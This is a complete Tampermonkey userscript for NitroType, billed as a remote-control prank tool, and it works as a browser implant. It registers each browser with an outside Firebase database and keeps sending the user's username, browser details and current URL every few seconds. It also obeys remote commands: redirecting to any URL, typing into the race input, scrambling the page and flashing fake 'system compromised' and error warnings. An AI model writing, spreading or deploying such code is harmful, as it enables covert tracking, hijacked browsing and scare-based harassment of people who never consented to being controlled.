// ==UserScript==
// @name         NitroType Remote Control
// @namespace    http://tampermonkey.net/
// @version      4.0
// @description  Remote control script for NitroType with 25+ pranks using Firebase
// @author       You
// @match        https://www.nitrotype.com/*
/// @license      MIT
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/557451/NitroType%20Remote%20Control.user.js
// @updateURL https://update.greasyfork.org/scripts/557451/NitroType%20Remote%20Control.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Firebase configuration
    const firebaseConfig = {
        apiKey: "AIzaSyCL7XUY6n56KoUHKOKC7WrQKDeZdiKL4yk",
        authDomain: "disciplemanager.firebaseapp.com",
        databaseURL: "https://disciplemanager-default-rtdb.firebaseio.com",
        projectId: "disciplemanager",
        storageBucket: "disciplemanager.firebasestorage.app",
        messagingSenderId: "333051652706",
        appId: "1:333051652706:web:18e8c82813245a583dff3b",
        measurementId: "G-CQKCCEGCQ4"
    };

    // Load Firebase SDKs
    const firebaseScript = document.createElement('script');
    firebaseScript.src = 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js';
    firebaseScript.onload = () => {
        const databaseScript = document.createElement('script');
        databaseScript.src = 'https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js';
        databaseScript.onload = () => {
            initializeFirebase();
        };
        document.head.appendChild(databaseScript);
    };
    document.head.appendChild(firebaseScript);

    let clientId = null;
    let database = null;
    let activePranks = new Set();

    function initializeFirebase() {
        firebase.initializeApp(firebaseConfig);
        database = firebase.database();
        
        // Generate unique client ID
        clientId = generateClientId();
        
        // Register this client
        registerClient();
        
        // Listen for commands
        listenForCommands();
        
        // Keep client alive
        setInterval(updateClientHeartbeat, 5000);
    }

    function generateClientId() {
        return Math.random().toString(36).substring(2, 9) + Date.now().toString(36);
    }

    // Get computer info
    function getComputerInfo() {
        // Try to get username from NitroType page
        let name = null;
        const nameElement = document.querySelector('span.db.type-ellip.type-ellip--account');
        if (nameElement) {
            name = nameElement.textContent.trim();
        }
        
        return {
            name: name,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            url: window.location.href,
            hostname: window.location.hostname,
            timestamp: new Date().toISOString()
        };
    }

    function registerClient() {
        if (!database) return;
        
        const clientRef = database.ref(`nitrotype/clients/${clientId}`);
        clientRef.set({
            info: getComputerInfo(),
            lastSeen: Date.now()
        });
        
        console.log('Registered with Firebase:', clientId);
    }

    function updateClientHeartbeat() {
        if (!database) return;
        
        const clientRef = database.ref(`nitrotype/clients/${clientId}`);
        clientRef.update({
            lastSeen: Date.now(),
            info: getComputerInfo()
        });
    }

    function listenForCommands() {
        if (!database) return;
        
        const commandsRef = database.ref(`nitrotype/commands/${clientId}`);
        commandsRef.on('value', (snapshot) => {
            const data = snapshot.val();
            if (data && data.command) {
                handleMessage(data);
                // Clear the command after processing
                commandsRef.remove();
            }
        });
    }

    // Handle incoming commands
    function handleMessage(message) {
        switch(message.command) {
            case 'navigate':
                if (message.url) window.location.href = message.url;
                break;
            case 'hide_dash':
                hideDashContent();
                break;
            case 'reload':
                window.location.reload();
                break;
            case 'spam_letters':
                spamLetters();
                break;
            case 'go_to_profile':
                window.location.href = 'https://www.nitrotype.com/racer/sidastuff';
                break;
            case 'flip_screen':
                flipScreen();
                break;
            case 'rotate_text':
                rotateText();
                break;
            case 'type_message':
                typeMessage();
                break;
            case 'simulate_mouse':
                simulateMouse();
                break;
            case 'multi_step_interaction':
                multiStepInteraction();
                break;
            case 'realistic_typing':
                realisticTyping();
                break;
            case 'auto_correct_typos':
                autoCorrectTypos();
                break;
            case 'random_pauses':
                randomPauses();
                break;
            case 'shake_screen':
                shakeScreen();
                break;
            case 'invert_colors':
                invertColors();
                break;
            case 'fake_errors':
                fakeErrors();
                break;
            case 'random_fonts':
                randomFonts();
                break;
            case 'fake_notifications':
                fakeNotifications();
                break;
            case 'fake_loading':
                fakeLoading();
                break;
            case 'change_cursor':
                changeCursor();
                break;
            case 'fake_system_msg':
                fakeSystemMsg();
                break;
            case 'unreadable_text':
                unreadableText();
                break;
            case 'slow_typing':
                slowTyping();
                break;
            case 'change_title':
                changeTitle();
                break;
            case 'interactive_sequence':
                interactiveSequence();
                break;
            case 'smart_typing':
                smartTyping();
                break;
            case 'mouse_trail':
                mouseTrail();
                break;
        }
    }

    // PRANK FUNCTIONS

    function hideDashContent() {
        const dashContent = document.querySelector('.dash-content');
        if (dashContent) dashContent.style.display = 'none';
    }

    function spamLetters() {
        const input = document.querySelector('.dash-copy-input');
        if (!input) return;
        const letters = 'abcdefghijklmnopqrstuvwxyz';
        const startTime = Date.now();
        const duration = 5000;
        function spam() {
            if (Date.now() - startTime < duration) {
                const randomLetter = letters[Math.floor(Math.random() * letters.length)];
                input.value += randomLetter;
                input.dispatchEvent(new Event('input', { bubbles: true }));
                setTimeout(spam, 50);
            }
        }
        spam();
    }

    function flipScreen() {
        document.body.style.transform = 'rotate(180deg)';
        activePranks.add('flip_screen');
    }

    function rotateText() {
        const style = document.createElement('style');
        style.id = 'rotate-text-style';
        style.textContent = `
            * { transform: rotate(${Math.random() * 360}deg) !important; }
        `;
        document.head.appendChild(style);
        activePranks.add('rotate_text');
    }

    function typeMessage() {
        const input = document.querySelector('.dash-copy-input');
        if (!input) return;
        
        const messages = [
            'Hello world, this is a test message',
            'The quick brown fox jumps over the lazy dog',
            'Typing speed is important for productivity',
            'Practice makes perfect when learning to type'
        ];
        
        const message = messages[Math.floor(Math.random() * messages.length)];
        input.value = '';
        input.focus();
        
        let index = 0;
        function typeChar() {
            if (index < message.length) {
                input.value += message[index];
                input.dispatchEvent(new Event('input', { bubbles: true }));
                input.dispatchEvent(new KeyboardEvent('keydown', { key: message[index], bubbles: true }));
                input.dispatchEvent(new KeyboardEvent('keyup', { key: message[index], bubbles: true }));
                index++;
                setTimeout(typeChar, 50 + Math.random() * 100);
            }
        }
        typeChar();
    }

    function simulateMouse() {
        let step = 0;
        const steps = [
            { x: 100, y: 100, delay: 500 },
            { x: 300, y: 200, delay: 800 },
            { x: 500, y: 150, delay: 600 },
            { x: 400, y: 300, delay: 700 }
        ];
        
        function moveMouse() {
            if (step < steps.length) {
                const stepData = steps[step];
                const event = new MouseEvent('mousemove', {
                    view: window,
                    bubbles: true,
                    cancelable: true,
                    clientX: stepData.x,
                    clientY: stepData.y
                });
                document.dispatchEvent(event);
                step++;
                setTimeout(moveMouse, stepData.delay);
            }
        }
        moveMouse();
    }

    function multiStepInteraction() {
        const input = document.querySelector('.dash-copy-input');
        if (!input) return;
        
        // Step 1: Focus input
        setTimeout(() => {
            input.focus();
            // Step 2: Type a few characters
            setTimeout(() => {
                input.value = 'test';
                input.dispatchEvent(new Event('input', { bubbles: true }));
                // Step 3: Clear and retype
                setTimeout(() => {
                    input.value = '';
                    setTimeout(() => {
                        input.value = 'hello';
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        // Step 4: Simulate backspace
                        setTimeout(() => {
                            input.value = 'hell';
                            input.dispatchEvent(new Event('input', { bubbles: true }));
                        }, 500);
                    }, 300);
                }, 500);
            }, 400);
        }, 200);
    }

    function realisticTyping() {
        const input = document.querySelector('.dash-copy-input');
        if (!input) return;
        
        const text = 'This is a realistic typing simulation with natural pauses and corrections';
        input.value = '';
        input.focus();
        
        let index = 0;
        function type() {
            if (index < text.length) {
                // Occasionally make a typo and correct it
                if (Math.random() < 0.1 && index > 5) {
                    const wrongChar = String.fromCharCode(text.charCodeAt(index) + 1);
                    input.value += wrongChar;
                    input.dispatchEvent(new Event('input', { bubbles: true }));
                    setTimeout(() => {
                        input.value = input.value.slice(0, -1) + text[index];
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        index++;
                        setTimeout(type, 80 + Math.random() * 120);
                    }, 200);
                } else {
                    input.value += text[index];
                    input.dispatchEvent(new Event('input', { bubbles: true }));
                    index++;
                    // Natural typing speed with occasional pauses
                    const delay = index % 20 === 0 ? 300 + Math.random() * 200 : 50 + Math.random() * 100;
                    setTimeout(type, delay);
                }
            }
        }
        type();
    }

    function autoCorrectTypos() {
        const input = document.querySelector('.dash-copy-input');
        if (!input) return;
        
        const originalValue = input.value;
        const typos = {
            'teh': 'the',
            'adn': 'and',
            'taht': 'that',
            'recieve': 'receive',
            'seperate': 'separate'
        };
        
        let modified = false;
        Object.keys(typos).forEach(typo => {
            if (input.value.includes(typo)) {
                input.value = input.value.replace(typo, typos[typo]);
                modified = true;
            }
        });
        
        if (modified) {
            input.dispatchEvent(new Event('input', { bubbles: true }));
            setTimeout(() => {
                input.value = originalValue;
                input.dispatchEvent(new Event('input', { bubbles: true }));
            }, 1000);
        }
    }

    function randomPauses() {
        const input = document.querySelector('.dash-copy-input');
        if (!input) return;
        
        input.focus();
        const text = 'Typing with random pauses to simulate thinking';
        let index = 0;
        
        function type() {
            if (index < text.length) {
                input.value += text[index];
                input.dispatchEvent(new Event('input', { bubbles: true }));
                index++;
                
                // Random pause every 5-10 characters
                const pause = index % 7 === 0 ? 500 + Math.random() * 1000 : 80 + Math.random() * 120;
                setTimeout(type, pause);
            }
        }
        type();
    }

    function shakeScreen() {
        const style = document.createElement('style');
        style.id = 'shake-style';
        style.textContent = `
            body {
                animation: shake 0.5s infinite !important;
            }
            @keyframes shake {
                0%, 100% { transform: translate(0, 0); }
                25% { transform: translate(-10px, -10px); }
                50% { transform: translate(10px, 10px); }
                75% { transform: translate(-10px, 10px); }
            }
        `;
        document.head.appendChild(style);
        activePranks.add('shake_screen');
    }

    function invertColors() {
        const style = document.createElement('style');
        style.id = 'invert-style';
        style.textContent = `
            * {
                filter: invert(1) !important;
            }
        `;
        document.head.appendChild(style);
        activePranks.add('invert_colors');
    }

    function fakeErrors() {
        const errorDiv = document.createElement('div');
        errorDiv.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:red;color:white;padding:20px;z-index:99999;font-size:20px;';
        errorDiv.textContent = 'CRITICAL ERROR: System failure detected!';
        document.body.appendChild(errorDiv);
        setTimeout(() => errorDiv.remove(), 5000);
    }

    function randomFonts() {
        const fonts = ['Comic Sans MS', 'Papyrus', 'Wingdings', 'Times New Roman', 'Arial'];
        const style = document.createElement('style');
        style.id = 'random-fonts-style';
        style.textContent = `
            * {
                font-family: ${fonts[Math.floor(Math.random() * fonts.length)]} !important;
                font-size: ${Math.random() * 50 + 10}px !important;
            }
        `;
        document.head.appendChild(style);
        activePranks.add('random_fonts');
    }

    function fakeNotifications() {
        const notification = document.createElement('div');
        notification.style.cssText = 'position:fixed;top:20px;right:20px;background:#333;color:white;padding:15px;border-radius:5px;z-index:99999;';
        notification.textContent = '🔔 New message: You have 999 unread emails!';
        document.body.appendChild(notification);
        setTimeout(() => notification.remove(), 5000);
    }

    function makeMove() {
        const style = document.createElement('style');
        style.id = 'make-move-style';
        style.textContent = `
            * {
                animation: move 1s infinite !important;
            }
            @keyframes move {
                0%, 100% { transform: translate(0, 0); }
                50% { transform: translate(20px, 20px); }
            }
        `;
        document.head.appendChild(style);
        activePranks.add('make_move');
    }

    function fakeLoading() {
        const loader = document.createElement('div');
        loader.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:white;display:flex;align-items:center;justify-content:center;z-index:99999;font-size:30px;';
        loader.innerHTML = 'Loading... Please wait...';
        document.body.appendChild(loader);
        setTimeout(() => loader.remove(), 5000);
    }

    function changeCursor() {
        const style = document.createElement('style');
        style.id = 'cursor-style';
        style.textContent = `
            * {
                cursor: crosshair !important;
            }
        `;
        document.head.appendChild(style);
        activePranks.add('change_cursor');
    }

    function fakeSystemMsg() {
        const msg = document.createElement('div');
        msg.style.cssText = 'position:fixed;bottom:20px;left:20px;background:blue;color:white;padding:15px;border-radius:5px;z-index:99999;';
        msg.textContent = '⚠️ System: Your computer has been compromised!';
        document.body.appendChild(msg);
        setTimeout(() => msg.remove(), 7000);
    }

    function unreadableText() {
        const style = document.createElement('style');
        style.id = 'unreadable-style';
        style.textContent = `
            * {
                letter-spacing: 50px !important;
                word-spacing: 100px !important;
            }
        `;
        document.head.appendChild(style);
        activePranks.add('unreadable_text');
    }

    function interactiveSequence() {
        const input = document.querySelector('.dash-copy-input');
        if (!input) return;
        
        const sequence = [
            () => { input.focus(); },
            () => { input.value = 'start'; input.dispatchEvent(new Event('input', { bubbles: true })); },
            () => { input.value = ''; },
            () => { input.value = 'typing'; input.dispatchEvent(new Event('input', { bubbles: true })); },
            () => { 
                const words = input.value.split(' ');
                words.push('more');
                input.value = words.join(' ');
                input.dispatchEvent(new Event('input', { bubbles: true }));
            },
            () => { input.value = input.value.slice(0, -5); input.dispatchEvent(new Event('input', { bubbles: true })); }
        ];
        
        let step = 0;
        function executeStep() {
            if (step < sequence.length) {
                sequence[step]();
                step++;
                setTimeout(executeStep, 400 + Math.random() * 400);
            }
        }
        executeStep();
    }

    function smartTyping() {
        const input = document.querySelector('.dash-copy-input');
        if (!input) return;
        
        const sentences = [
            'The first sentence is typed normally.',
            'Then we pause for a moment...',
            'Before continuing with more text.',
            'This simulates natural writing patterns.'
        ];
        
        let sentenceIndex = 0;
        let charIndex = 0;
        input.value = '';
        input.focus();
        
        function type() {
            if (sentenceIndex < sentences.length) {
                const sentence = sentences[sentenceIndex];
                if (charIndex < sentence.length) {
                    input.value += sentence[charIndex];
                    input.dispatchEvent(new Event('input', { bubbles: true }));
                    charIndex++;
                    setTimeout(type, 60 + Math.random() * 80);
                } else {
                    // Pause between sentences
                    setTimeout(() => {
                        input.value += ' ';
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        sentenceIndex++;
                        charIndex = 0;
                        setTimeout(type, 800 + Math.random() * 1200);
                    }, 500);
                }
            }
        }
        type();
    }

    function mouseTrail() {
        const trail = [];
        const maxTrail = 10;
        
        function createTrailElement(x, y) {
            const dot = document.createElement('div');
            dot.style.cssText = `position:fixed;left:${x}px;top:${y}px;width:5px;height:5px;background:rgba(0,0,0,0.5);border-radius:50%;pointer-events:none;z-index:99999;`;
            document.body.appendChild(dot);
            trail.push(dot);
            
            if (trail.length > maxTrail) {
                const old = trail.shift();
                setTimeout(() => old.remove(), 200);
            }
            
            setTimeout(() => {
                dot.style.opacity = '0';
                dot.style.transition = 'opacity 0.3s';
                setTimeout(() => dot.remove(), 300);
            }, 500);
        }
        
        let step = 0;
        const path = [
            { x: 100, y: 100 },
            { x: 200, y: 150 },
            { x: 300, y: 120 },
            { x: 400, y: 200 },
            { x: 500, y: 180 }
        ];
        
        function animate() {
            if (step < path.length) {
                const point = path[step];
                createTrailElement(point.x, point.y);
                const event = new MouseEvent('mousemove', {
                    view: window,
                    bubbles: true,
                    cancelable: true,
                    clientX: point.x,
                    clientY: point.y
                });
                document.dispatchEvent(event);
                step++;
                setTimeout(animate, 300);
            }
        }
        animate();
    }

    function slowTyping() {
        const input = document.querySelector('.dash-copy-input');
        if (!input) return;
        const originalAddEventListener = input.addEventListener;
        input.addEventListener = function(type, listener) {
            if (type === 'keydown' || type === 'keypress') {
                return originalAddEventListener.call(this, type, function(e) {
                    setTimeout(() => listener(e), 500);
                });
            }
            return originalAddEventListener.call(this, type, listener);
        };
        activePranks.add('slow_typing');
    }

    function changeTitle() {
        const titles = ['NitroType', 'Typing Test', 'Speed Typing', 'NitroType - Race'];
        let index = 0;
        const interval = setInterval(() => {
            document.title = titles[index % titles.length];
            index++;
        }, 2000);
        activePranks.add('change_title');
    }

})();
